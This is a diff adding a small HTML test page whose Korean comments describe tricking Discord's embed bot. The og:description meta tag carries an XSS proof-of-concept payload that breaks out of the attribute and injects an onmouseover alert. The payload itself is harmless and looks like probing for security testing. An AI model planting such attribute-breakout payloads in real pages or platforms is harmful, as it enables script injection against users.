@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Cool Webpage</title>
+        
+    <!-- Discord 임베드 봇을 속이기 위한 메타 태그 -->
+    <meta property="og:title" content="평범한 제목인 척">
+        
+    <!-- [핵심] 공격 페이로드를 숨겨둘 메타 태그 -->
+    <!-- onmouseover 이벤트 핸들러를 이용한 XSS 시도 -->
+    <meta property="og:description" content='이 설명은 정상입니다. " onmouseover=alert("XSS Success!")>'>
+        
+    <meta property="og:image" content="https://i.imgur.com/link_to_your_image.png">
+    <meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+    <h1>Welcome to my page!</h1>
+    <p>This is a test page for Discord embed functionality.</p>
+</body>
+</html>
